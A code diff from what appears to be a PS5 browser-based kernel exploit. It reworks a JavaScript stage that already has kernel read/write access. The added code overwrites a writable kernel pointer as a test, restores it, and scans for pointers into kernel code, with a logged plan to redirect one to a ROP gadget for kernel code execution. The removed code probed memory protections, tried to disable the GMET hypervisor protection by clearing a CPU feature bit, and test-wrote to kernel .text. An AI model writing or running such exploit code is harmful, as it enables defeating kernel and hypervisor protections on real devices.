@@ -595,485 +595,101 @@ async function main(userlandRW, wkOnly = false) {
         const KDATA_OFFSET_SVM_FEATURE_TABLE = 0x330BB0; // SVM feature name table
         const KDATA_OFFSET_VM_PMAP = 0x409132;          // vm.pmap.pcid_enabled sysctl
 
-        // Helper to read and display memory region
-        async function hexdump_kdata(offset, length, label) {
-            await log("[GMET] " + label + " @ kdataBase+0x" + offset.toString(16) + ":", LogLevel.WARN);
-            let addr = krw.kdataBase.add32(offset);
-            let hex = "";
-            let ascii = "";
-            for (let i = 0; i < length; i++) {
-                let byte = await krw.read1(addr.add32(i));
-                hex += byte.toString(16).padStart(2, '0') + " ";
-                ascii += (byte >= 0x20 && byte < 0x7f) ? String.fromCharCode(byte) : ".";
-                if ((i + 1) % 16 === 0) {
-                    await log("  " + hex + " |" + ascii + "|", LogLevel.INFO);
-                    hex = "";
-                    ascii = "";
-                }
-            }
-            if (hex) {
-                await log("  " + hex.padEnd(48) + " |" + ascii + "|", LogLevel.INFO);
-            }
-        }
-
-        // Search for potential control variables (look for small integers near string refs)
-        async function search_before_string(string_offset, search_range) {
-            await log("[GMET] Searching " + search_range + " bytes BEFORE string for control vars...", LogLevel.WARN);
-            let found_candidates = [];
-            for (let i = search_range; i > 0; i -= 8) {
-                let addr = krw.kdataBase.add32(string_offset - i);
-                let val = await krw.read8(addr);
-                // Look for small values that could be flags/booleans
-                if (val.hi === 0 && val.low >= 0 && val.low <= 0xFF) {
-                    found_candidates.push({offset: string_offset - i, value: val.low});
-                }
-            }
-            return found_candidates;
-        }
-
-        // Skip slow GMET analysis - go directly to CFI bypass test
-        let doGmetAnalysis = false; // Disabled - was causing OOM in PS5 browser
-
-        if (doGmetAnalysis) {
-            // This section is disabled due to memory constraints
-            await log("========== HYPERVISOR BYPASS ANALYSIS ==========", LogLevel.SUCCESS);
-            await log("(Slow analysis phases skipped to avoid OOM)", LogLevel.WARN);
-        }
-
-        // Always show the CFI test option
+        // =========================================================================
+        // WRITABLE POINTER EXPLOIT RESEARCH
+        //
+        // CONFIRMED FINDINGS:
+        // - Writable region: kdataBase + 0x0 to ~0xF000 (~60KB)
+        // - Write-protected: 0x10000+ (apic_ops, sysentvec, etc.)
+        // - Writable kernel pointer found at: kdataBase + 0x4a48
+        // - Pointer value: ~ktextBase + 0x13b000
+        // =========================================================================
         {
-            await log("========== ANALYSIS COMPLETE ==========", LogLevel.SUCCESS);
+            await log("========== WRITABLE POINTER EXPLOIT ==========", LogLevel.SUCCESS);
+            await log("[INFO] Writable region: kdataBase + 0x0 to ~0xF000", LogLevel.INFO);
+            await log("[INFO] ktextBase: " + krw.ktextBase, LogLevel.INFO);
+            await log("[INFO] kdataBase: " + krw.kdataBase, LogLevel.INFO);
 
-            // =========================================================================
-            // CFI BYPASS TEST: Write to non-function-pointer data (sysentvec flag)
-            // The mystery flag at offset 0xD11D08 is a small integer (0x00000001),
-            // NOT a function pointer. CFI should only protect function pointer writes.
-            // If we can write to this without crashing, data-only attacks are viable!
-            // =========================================================================
+            // Read the writable pointer at 0x4a48
+            let ptr4a48 = await krw.read8(krw.kdataBase.add32(0x4a48));
+            let ptrOffset = ptr4a48.low - krw.ktextBase.low;
 
-            // =========================================================================
-            // MEMORY PROTECTION ANALYSIS
-            // Test writes at different offsets to find protection boundaries
-            // We know 0x4bf0 works but 0xD11D08 crashes - let's map the boundary
-            // =========================================================================
+            await log("[0x4a48] Pointer value: " + ptr4a48, LogLevel.SUCCESS);
+            await log("[0x4a48] Points to: ktextBase + 0x" + ptrOffset.toString(16), LogLevel.INFO);
 
-            let doProtectionTest = confirm(
-                "MEMORY PROTECTION ANALYSIS\n\n" +
-                "Finding: Write to 0xD11D08 crashed!\n" +
-                "But writes to 0x4bf0 (SVM cache) worked.\n\n" +
-                "This will test READ at various offsets to map\n" +
-                "the protected region WITHOUT writing.\n\n" +
-                "OK = Run read-only analysis\n" +
-                "Cancel = Skip"
+            // Read target contents
+            await log("[TARGET] Reading pointer target...", LogLevel.WARN);
+            try {
+                for (let i = 0; i < 4; i++) {
+                    let v = await krw.read8(ptr4a48.add32(i * 8));
+                    await log("  +" + (i * 8).toString(16) + ": " + v, LogLevel.INFO);
+                }
+
+                let firstByte = await krw.read1(ptr4a48);
+                let secondByte = await krw.read1(ptr4a48.add32(1));
+                await log("[TARGET] First bytes: 0x" + firstByte.toString(16) + " 0x" + secondByte.toString(16), LogLevel.INFO);
+
+                if (firstByte === 0x55 || (firstByte === 0x48 && secondByte === 0x89)) {
+                    await log("[TARGET] Looks like CODE (function prologue)!", LogLevel.SUCCESS);
+                }
+            } catch (e) {
+                await log("[TARGET] Read failed: " + e, LogLevel.ERROR);
+            }
+
+            // Test pointer modification
+            let doTest = confirm(
+                "TEST POINTER MODIFICATION\n\n" +
+                "Pointer at 0x4a48: " + ptr4a48 + "\n" +
+                "Target: ktextBase + 0x" + ptrOffset.toString(16) + "\n\n" +
+                "This will modify, verify, and restore the pointer.\n\n" +
+                "OK = Test\nCancel = Skip"
             );
 
-            if (doProtectionTest) {
-                await log("========== MEMORY PROTECTION ANALYSIS ==========", LogLevel.SUCCESS);
+            if (doTest) {
+                let original = await krw.read8(krw.kdataBase.add32(0x4a48));
+                let testVal = new int64(original.low ^ 0x1000, original.hi);
 
-                // Test offsets - we'll READ these to understand the memory layout
-                const testOffsets = [
-                    { offset: 0x4bf0, name: "SVM feature cache (known writable)" },
-                    { offset: 0x170650, name: "apic_ops (function pointers)" },
-                    { offset: 0xD11BB8, name: "sysentvec_ps5" },
-                    { offset: 0xD11D08, name: "mystery flag (crashed on write)" },
-                    { offset: 0xD11D30, name: "sysentvec_ps4" },
-                ];
+                await log("[TEST] Writing: " + testVal, LogLevel.WARN);
+                await krw.write8(krw.kdataBase.add32(0x4a48), testVal);
 
-                for (let test of testOffsets) {
-                    let addr = krw.kdataBase.add32(test.offset);
-                    let val = await krw.read8(addr);
-                    await log("[READ] 0x" + test.offset.toString(16) + " (" + test.name + "): " + val, LogLevel.INFO);
-                }
+                let verify = await krw.read8(krw.kdataBase.add32(0x4a48));
 
-                // Now let's check if the issue is the OFFSET itself
-                // The kernel data dump was from 4.03 - offsets might be different
-                await log("[ANALYSIS] Checking if 0xD11D08 might be out of bounds...", LogLevel.WARN);
+                if (verify.low === testVal.low && verify.hi === testVal.hi) {
+                    await log("[TEST] SUCCESS! Pointer is WRITABLE!", LogLevel.SUCCESS);
 
-                // Read the security flags offset (we know this works)
-                await log("[ANALYSIS] Security flags offset: 0x" + OFFSET_KERNEL_SECURITY_FLAGS.toString(16), LogLevel.INFO);
-                await log("[ANALYSIS] QA flags offset: 0x" + OFFSET_KERNEL_QA_FLAGS.toString(16), LogLevel.INFO);
+                    await krw.write8(krw.kdataBase.add32(0x4a48), original);
+                    await log("[TEST] Restored original value", LogLevel.INFO);
 
-                // These are the offsets etaHEN uses - they're from ktextBase not kdataBase!
-                await log("[ANALYSIS] Note: etaHEN offsets are from ktextBase, not kdataBase!", LogLevel.WARN);
-                await log("[ANALYSIS] ktextBase: " + krw.ktextBase, LogLevel.INFO);
-                await log("[ANALYSIS] kdataBase: " + krw.kdataBase, LogLevel.INFO);
+                    // Scan for all pointers in writable region
+                    await log("[SCAN] Scanning writable region for all kernel pointers...", LogLevel.WARN);
 
-                // Calculate the actual addresses
-                let secFlagsAddr = krw.ktextBase.add32(OFFSET_KERNEL_SECURITY_FLAGS);
-                let qaFlagsAddr = krw.ktextBase.add32(OFFSET_KERNEL_QA_FLAGS);
-
-                await log("[ANALYSIS] Security flags at: " + secFlagsAddr, LogLevel.INFO);
-                await log("[ANALYSIS] QA flags at: " + qaFlagsAddr, LogLevel.INFO);
-
-                // The question is: what makes 0xD11D08 different?
-                // Let's calculate the actual kernel address
-                let mysteryAddr = krw.kdataBase.add32(0xD11D08);
-                await log("[ANALYSIS] Mystery flag would be at: " + mysteryAddr, LogLevel.INFO);
-
-                // Check if it's even in a valid kernel range
-                await log("[ANALYSIS] Is 0xD11D08 too far from kdataBase?", LogLevel.WARN);
-                await log("[ANALYSIS] 0xD11D08 = ~13.7 MB into kernel data", LogLevel.INFO);
-
-                // Try reading at smaller offsets first to verify kernel read works
-                await log("[ANALYSIS] Testing reads at increasing offsets...", LogLevel.WARN);
-
-                const probeOffsets = [0x1000, 0x10000, 0x100000, 0x500000, 0xA00000, 0xD00000, 0xD11D00];
-                for (let off of probeOffsets) {
-                    try {
-                        let val = await krw.read4(krw.kdataBase.add32(off));
-                        await log("[PROBE] kdataBase+0x" + off.toString(16) + " = 0x" + val.toString(16) + " (readable)", LogLevel.INFO);
-                    } catch (e) {
-                        await log("[PROBE] kdataBase+0x" + off.toString(16) + " = FAILED TO READ", LogLevel.ERROR);
-                    }
-                }
-
-                await log("========== ANALYSIS COMPLETE ==========", LogLevel.SUCCESS);
-
-                // =========================================================================
-                // WRITE PERMISSION TEST
-                // We know 0x4bf0 is writable, 0xD11D08 is read-only
-                // Test apic_ops (0x170650) to see if function pointers are in RW region
-                // =========================================================================
-
-                let doWriteTest = confirm(
-                    "WRITABLE REGION ANALYSIS\n\n" +
-                    "CONFIRMED BOUNDARY:\n" +
-                    "- 0x0 to 0x8000 = WRITABLE (~32KB)\n" +
-                    "- 0x10000+ = WRITE PROTECTED\n\n" +
-                    "This will:\n" +
-                    "1. Optionally find exact boundary (0x9000-0xF000)\n" +
-                    "2. Scan writable region for kernel pointers\n" +
-                    "3. Dump SVM cache area\n\n" +
-                    "OK = Analyze writable region\n" +
-                    "Cancel = Skip"
-                );
-
-                if (doWriteTest) {
-                    // KNOWN BOUNDARY: 0x8000 works, 0x10000 crashes
-                    // Writable region is approximately 32KB-64KB from kdataBase
-
-                    await log("[BOUNDARY] === CONFIRMED RESULTS ===", LogLevel.SUCCESS);
-                    await log("[BOUNDARY] 0x5000 (20KB) = WRITABLE", LogLevel.SUCCESS);
-                    await log("[BOUNDARY] 0x6000 (24KB) = WRITABLE", LogLevel.SUCCESS);
-                    await log("[BOUNDARY] 0x8000 (32KB) = WRITABLE", LogLevel.SUCCESS);
-                    await log("[BOUNDARY] 0x10000 (64KB) = CRASHES", LogLevel.ERROR);
-                    await log("[BOUNDARY] Boundary is between 0x8000-0x10000", LogLevel.WARN);
-
-                    // Fine-grained search between 0x8000 and 0x10000
-                    let doFineSearch = confirm(
-                        "FINE BOUNDARY SEARCH\n\n" +
-                        "Boundary is between 0x8000-0x10000.\n\n" +
-                        "Test at 0x1000 intervals to find exact boundary?\n" +
-                        "(0x9000, 0xA000, 0xB000, etc.)\n\n" +
-                        "OK = Find exact boundary\n" +
-                        "Cancel = Skip to memory dump"
-                    );
-
-                    let exactBoundary = 0x8000;
-
-                    if (doFineSearch) {
-                        const fineOffsets = [0x9000, 0xA000, 0xB000, 0xC000, 0xD000, 0xE000, 0xF000];
-
-                        for (let off of fineOffsets) {
-                            let addr = krw.kdataBase.add32(off);
-                            let val = await krw.read4(addr);
-
-                            let doTest = confirm(
-                                "Test write at 0x" + off.toString(16) + "?\n\n" +
-                                "Value: 0x" + val.toString(16) + "\n" +
-                                "Last good: 0x" + exactBoundary.toString(16) + "\n\n" +
-                                "OK = Test\nCancel = Stop"
-                            );
-
-                            if (!doTest) break;
-
-                            await log("[FINE] Testing 0x" + off.toString(16) + "...", LogLevel.WARN);
-                            await krw.write4(addr, val);
-                            await log("[FINE] 0x" + off.toString(16) + " = WRITABLE!", LogLevel.SUCCESS);
-                            exactBoundary = off;
-                        }
-                    }
-
-                    await log("[BOUNDARY] Exact boundary: ~0x" + exactBoundary.toString(16), LogLevel.SUCCESS);
-
-                    // Now dump the ENTIRE writable region to find useful structures
-                    await log("========== WRITABLE REGION DUMP ==========", LogLevel.SUCCESS);
-                    await log("[DUMP] Scanning 0x0 to 0x" + (exactBoundary + 0x1000).toString(16) + " for structures...", LogLevel.WARN);
-
-                    // Look for REAL kernel pointers (filter out -1 and masks)
                     let foundPointers = [];
-
-                    for (let off = 0; off < exactBoundary + 0x1000; off += 8) {
+                    for (let off = 0; off < 0x10000; off += 8) {
                         let val = await krw.read8(krw.kdataBase.add32(off));
-
-                        // Filter criteria for REAL kernel pointers:
-                        // 1. High bits are 0xffffffff (kernel space)
-                        // 2. Low bits have 0x80000000 set (high kernel)
-                        // 3. NOT 0xffffffffffffffff (-1)
-                        // 4. NOT a mask pattern (lots of consecutive f's or 0's)
-
                         if (val.hi === 0xffffffff && (val.low & 0x80000000)) {
-                            // Filter out -1
                             if (val.low === 0xffffffff) continue;
-
-                            // Filter out masks (if low has too many f's or 0's in a row)
                             let lowHex = val.low.toString(16).padStart(8, '0');
                             if (lowHex.match(/^f{4,}/) || lowHex.match(/0{4,}$/)) continue;
 
-                            foundPointers.push({ offset: off, value: val });
-                            await log("[PTR] 0x" + off.toString(16) + ": " + val + " (REAL kernel pointer!)", LogLevel.SUCCESS);
-                        }
-                    }
-
-                    await log("[DUMP] Found " + foundPointers.length + " real kernel pointers in writable region", LogLevel.SUCCESS);
-
-                    // SPECIFIC INVESTIGATION: offset 0x4a48 had a real pointer!
-                    await log("========== INVESTIGATING 0x4a48 ==========", LogLevel.SUCCESS);
-
-                    // Dump context around 0x4a48
-                    await log("[0x4a48] Dumping context around the pointer:", LogLevel.INFO);
-                    for (let off = 0x4a00; off < 0x4b00; off += 8) {
-                        let val = await krw.read8(krw.kdataBase.add32(off));
-                        let marker = (off === 0x4a48) ? " <== TARGET" : "";
-                        await log("  0x" + off.toString(16) + ": " + val + marker, LogLevel.INFO);
-                    }
-
-                    // Read the pointer value
-                    let ptr4a48 = await krw.read8(krw.kdataBase.add32(0x4a48));
-                    await log("[0x4a48] Pointer value: " + ptr4a48, LogLevel.WARN);
-
-                    // Calculate what this pointer might be relative to ktextBase
-                    // ptr4a48 = 0xffffffffd134b000 (from user report)
-                    // ktextBase = 0xffffffff87fd0000 (from earlier)
-                    // Difference would tell us the offset into kernel
-
-                    await log("[0x4a48] Analyzing pointer target...", LogLevel.INFO);
-                    await log("[0x4a48] ktextBase: " + krw.ktextBase, LogLevel.INFO);
-
-                    // Try to read what the pointer points to
-                    await log("[0x4a48] Attempting to read target of pointer...", LogLevel.WARN);
-                    try {
-                        let targetVal = await krw.read8(ptr4a48);
-                        await log("[0x4a48] Target value: " + targetVal, LogLevel.SUCCESS);
-
-                        // Read more context at the target
-                        await log("[0x4a48] Target context:", LogLevel.INFO);
-                        for (let i = 0; i < 8; i++) {
-                            let v = await krw.read8(ptr4a48.add32(i * 8));
-                            await log("  +" + (i * 8).toString(16) + ": " + v, LogLevel.INFO);
-                        }
-                    } catch (e) {
-                        await log("[0x4a48] Could not read target: " + e, LogLevel.ERROR);
-                    }
-
-                    // KEY QUESTION: Can we modify this pointer?
-                    await log("========== POINTER MODIFICATION TEST ==========", LogLevel.SUCCESS);
-
-                    let doPointerTest = confirm(
-                        "TEST: Modify pointer at 0x4a48?\n\n" +
-                        "Current value: " + ptr4a48 + "\n\n" +
-                        "This will:\n" +
-                        "1. Save current value\n" +
-                        "2. Write a test value\n" +
-                        "3. Verify it changed\n" +
-                        "4. Restore original\n\n" +
-                        "If CFI blocks this, it may crash.\n" +
-                        "If it works, we have a writable pointer!\n\n" +
-                        "OK = Test pointer modification\n" +
-                        "Cancel = Skip"
-                    );
-
-                    if (doPointerTest) {
-                        await log("[TEST] Saving original value...", LogLevel.INFO);
-                        let original = await krw.read8(krw.kdataBase.add32(0x4a48));
-
-                        // Calculate offset from ktextBase
-                        await log("[ANALYSIS] Pointer value: " + original, LogLevel.INFO);
-                        await log("[ANALYSIS] ktextBase: " + krw.ktextBase, LogLevel.INFO);
-
-                        // Calculate the offset this pointer represents
-                        let ptrOffset = original.low - krw.ktextBase.low;
-                        await log("[ANALYSIS] Pointer offset from ktextBase: 0x" + ptrOffset.toString(16), LogLevel.SUCCESS);
-
-                        // Read what the pointer points to
-                        await log("[ANALYSIS] Reading target of pointer...", LogLevel.WARN);
-                        try {
-                            // Read first 64 bytes at the target
-                            await log("[TARGET] Contents at pointer target:", LogLevel.INFO);
-                            for (let i = 0; i < 8; i++) {
-                                let v = await krw.read8(original.add32(i * 8));
-                                await log("  +" + (i * 8).toString(16) + ": " + v, LogLevel.INFO);
+                            let textOff = val.low - krw.ktextBase.low;
+                            if (textOff >= 0 && textOff < 0x1000000) {
+                                foundPointers.push({ offset: off, value: val, textOffset: textOff });
                             }
-
-                            // Check if the target looks like code or data
-                            let firstByte = await krw.read1(original);
-                            let secondByte = await krw.read1(original.add32(1));
-                            await log("[TARGET] First bytes: " + firstByte.toString(16) + " " + secondByte.toString(16), LogLevel.INFO);
-
-                            // Common function prologues: 55 (push rbp), 48 89 (mov), etc.
-                            if (firstByte === 0x55 || (firstByte === 0x48 && secondByte === 0x89)) {
-                                await log("[TARGET] Looks like CODE (function prologue detected)!", LogLevel.SUCCESS);
-                            } else if (firstByte === 0x00 && secondByte === 0x00) {
-                                await log("[TARGET] Looks like DATA (zeros)", LogLevel.INFO);
-                            }
-                        } catch (e) {
-                            await log("[TARGET] Could not read: " + e, LogLevel.ERROR);
-                        }
-
-                        await log("[TEST] Writing test value (original XOR 0x1000)...", LogLevel.WARN);
-                        let testVal = new int64(original.low ^ 0x1000, original.hi);
-                        await krw.write8(krw.kdataBase.add32(0x4a48), testVal);
-
-                        let verify = await krw.read8(krw.kdataBase.add32(0x4a48));
-                        await log("[TEST] Read back: " + verify, LogLevel.INFO);
-
-                        if (verify.low === testVal.low && verify.hi === testVal.hi) {
-                            await log("[TEST] SUCCESS! Pointer is WRITABLE!", LogLevel.SUCCESS);
-                            await log("[TEST] We can modify kernel pointers in this region!", LogLevel.SUCCESS);
-
-                            // Restore original
-                            await log("[TEST] Restoring original value...", LogLevel.INFO);
-                            await krw.write8(krw.kdataBase.add32(0x4a48), original);
-                            let restored = await krw.read8(krw.kdataBase.add32(0x4a48));
-                            await log("[TEST] Restored: " + restored, LogLevel.SUCCESS);
-
-                            // NOW THE KEY QUESTION: Can we exploit this?
-                            await log("========== EXPLOITATION ANALYSIS ==========", LogLevel.SUCCESS);
-                            await log("[EXPLOIT] We have a writable kernel pointer at kdataBase+0x4a48", LogLevel.WARN);
-                            await log("[EXPLOIT] It points to ktextBase+0x" + ptrOffset.toString(16), LogLevel.WARN);
-                            await log("[EXPLOIT] Potential attack vectors:", LogLevel.INFO);
-                            await log("  1. If this is a function pointer -> redirect to ROP gadget", LogLevel.INFO);
-                            await log("  2. If this is a data pointer -> redirect to controlled data", LogLevel.INFO);
-                            await log("  3. Search for more writable pointers in 0x0-0xF000 region", LogLevel.INFO);
-
-                            // Scan for ALL writable pointers that point to kernel .text
-                            await log("[SCAN] Scanning for function pointers (pointing to .text)...", LogLevel.WARN);
-
-                            let textPointers = [];
-                            for (let ptr of foundPointers) {
-                                // Check if pointer points near ktextBase (within ~16MB)
-                                let offset = ptr.value.low - krw.ktextBase.low;
-                                if (offset >= 0 && offset < 0x1000000) {  // Within 16MB of text
-                                    textPointers.push({ ...ptr, textOffset: offset });
-                                    await log("[FUNCPTR] 0x" + ptr.offset.toString(16) +
-                                        " -> ktextBase+0x" + offset.toString(16), LogLevel.SUCCESS);
-                                }
-                            }
-
-                            await log("[SCAN] Found " + textPointers.length + " pointers to kernel .text!", LogLevel.SUCCESS);
-
-                            if (textPointers.length > 0) {
-                                await log("[EXPLOIT] These could be FUNCTION POINTERS!", LogLevel.WARN);
-                                await log("[EXPLOIT] If we redirect one to a ROP gadget and trigger its call...", LogLevel.WARN);
-                                await log("[EXPLOIT] ...we could gain kernel code execution!", LogLevel.SUCCESS);
-                            }
-                        } else {
-                            await log("[TEST] Write may have failed or been blocked", LogLevel.WARN);
                         }
                     }
 
-                    // Also dump the SVM cache area specifically
-                    await log("[SVM] Dumping SVM cache region (0x4b00-0x5000):", LogLevel.INFO);
-                    for (let off = 0x4b00; off < 0x5000; off += 0x20) {
-                        let line = "0x" + off.toString(16) + ":";
-                        for (let i = 0; i < 4; i++) {
-                            let v = await krw.read4(krw.kdataBase.add32(off + i * 4));
-                            line += " " + v.toString(16).padStart(8, '0');
-                        }
-                        await log(line, LogLevel.INFO);
+                    await log("[SCAN] Found " + foundPointers.length + " pointers to .text in writable region", LogLevel.SUCCESS);
+
+                    for (let ptr of foundPointers) {
+                        await log("[PTR] 0x" + ptr.offset.toString(16) + " -> ktextBase+0x" + ptr.textOffset.toString(16), LogLevel.WARN);
                     }
 
-                    if (foundPointers.length > 0) {
-                        await log("========== POTENTIAL ATTACK VECTORS ==========", LogLevel.SUCCESS);
-                        await log("[ANALYSIS] Found kernel pointers in WRITABLE memory!", LogLevel.WARN);
-                        await log("[ANALYSIS] These could potentially be hijacked for code execution", LogLevel.WARN);
-
-                        for (let ptr of foundPointers) {
-                            await log("[TARGET] Offset 0x" + ptr.offset.toString(16) + " = " + ptr.value, LogLevel.WARN);
-                        }
-                    }
-                }
-            }
-
-            // EXPERIMENTAL: Try to modify the SVM feature cache to disable GMET
-            // Offset 0x4bf0 appears to contain cached CPUID SVM features
-            // Value 0x740f12 has bit 18 (GMET) set
-            const SVM_FEATURE_CACHE_OFFSET = 0x4bf0;
-
-            let currentSvmFeatures = await krw.read4(krw.kdataBase.add32(SVM_FEATURE_CACHE_OFFSET));
-            await log("[TEST] Current SVM feature cache @ +0x4bf0: 0x" + currentSvmFeatures.toString(16), LogLevel.WARN);
-            await log("[TEST] Bit 18 (GMET) is: " + ((currentSvmFeatures & 0x40000) ? "SET" : "CLEAR"), LogLevel.INFO);
-
-            let doModify = confirm(
-                "EXPERIMENTAL: Modify SVM Feature Cache?\n\n" +
-                "Current value at kdataBase+0x4bf0: 0x" + currentSvmFeatures.toString(16) + "\n" +
-                "Bit 18 (GMET support): " + ((currentSvmFeatures & 0x40000) ? "ENABLED" : "DISABLED") + "\n\n" +
-                "This will CLEAR bit 18 to make kernel think\n" +
-                "CPU doesn't support GMET.\n\n" +
-                "New value would be: 0x" + (currentSvmFeatures & ~0x40000).toString(16) + "\n\n" +
-                "OK = Modify (EXPERIMENTAL - may crash!)\n" +
-                "Cancel = Skip"
-            );
-
-            if (doModify) {
-                let newValue = currentSvmFeatures & ~0x40000;  // Clear bit 18
-                await log("[TEST] Writing new value: 0x" + newValue.toString(16), LogLevel.WARN);
-                await krw.write4(krw.kdataBase.add32(SVM_FEATURE_CACHE_OFFSET), newValue);
-
-                // Verify
-                let verifyValue = await krw.read4(krw.kdataBase.add32(SVM_FEATURE_CACHE_OFFSET));
-                await log("[TEST] Verify read: 0x" + verifyValue.toString(16), LogLevel.INFO);
-
-                if (verifyValue === newValue) {
-                    await log("[TEST] SUCCESS: SVM feature cache modified!", LogLevel.SUCCESS);
-                    await log("[TEST] GMET bit is now: " + ((verifyValue & 0x40000) ? "SET" : "CLEAR"), LogLevel.SUCCESS);
-                    await log("[TEST] Note: This may only affect future HV operations", LogLevel.INFO);
+                    await log("========== NEXT STEPS ==========", LogLevel.SUCCESS);
+                    await log("[TODO] 1. Identify what these pointers are used for", LogLevel.INFO);
+                    await log("[TODO] 2. Find how to trigger a call through one of them", LogLevel.INFO);
+                    await log("[TODO] 3. Redirect to ROP gadget for code execution", LogLevel.INFO);
                 } else {
-                    await log("[TEST] FAILED: Write did not stick (value = 0x" + verifyValue.toString(16) + ")", LogLevel.ERROR);
-                }
-
-                // Also try the second location
-                const SVM_FEATURE_CACHE_OFFSET2 = 0x4dcc;
-                let current2 = await krw.read4(krw.kdataBase.add32(SVM_FEATURE_CACHE_OFFSET2));
-                if ((current2 & 0x40000) !== 0) {
-                    await log("[TEST] Also clearing bit 18 at +0x4dcc (was 0x" + current2.toString(16) + ")", LogLevel.WARN);
-                    await krw.write4(krw.kdataBase.add32(SVM_FEATURE_CACHE_OFFSET2), current2 & ~0x40000);
-                    let verify2 = await krw.read4(krw.kdataBase.add32(SVM_FEATURE_CACHE_OFFSET2));
-                    await log("[TEST] Verify +0x4dcc: 0x" + verify2.toString(16), LogLevel.INFO);
-                }
-
-                // TEST: Try to write to kernel .text to see if GMET is actually disabled
-                let doTextTest = confirm(
-                    "TEST: Try writing to kernel .text?\n\n" +
-                    "This will attempt to read a byte from ktextBase,\n" +
-                    "then write the SAME value back.\n\n" +
-                    "If GMET is disabled, this should succeed.\n" +
-                    "If GMET is still active, this may crash.\n\n" +
-                    "OK = Try write test\n" +
-                    "Cancel = Skip"
-                );
-
-                if (doTextTest) {
-                    await log("[GMET TEST] Reading from ktextBase...", LogLevel.WARN);
-                    let textByte = await krw.read1(krw.ktextBase);
-                    await log("[GMET TEST] Read byte: 0x" + textByte.toString(16), LogLevel.INFO);
-
-                    await log("[GMET TEST] Attempting to write same byte back...", LogLevel.WARN);
-                    try {
-                        await krw.write1(krw.ktextBase, textByte);
-                        await log("[GMET TEST] Write completed without crash!", LogLevel.SUCCESS);
-
-                        // Verify
-                        let verifyByte = await krw.read1(krw.ktextBase);
-                        if (verifyByte === textByte) {
-                            await log("[GMET TEST] Verify OK - value unchanged as expected", LogLevel.SUCCESS);
-                            await log("[GMET TEST] GMET may be disabled! Try function pointer test next.", LogLevel.SUCCESS);
-                        } else {
-                            await log("[GMET TEST] WARNING: Value changed to 0x" + verifyByte.toString(16), LogLevel.ERROR);
-                        }
-                    } catch (e) {
-                        await log("[GMET TEST] Write failed with error: " + e, LogLevel.ERROR);
-                    }
+                    await log("[TEST] Write failed", LogLevel.ERROR);
                 }
             }
         }
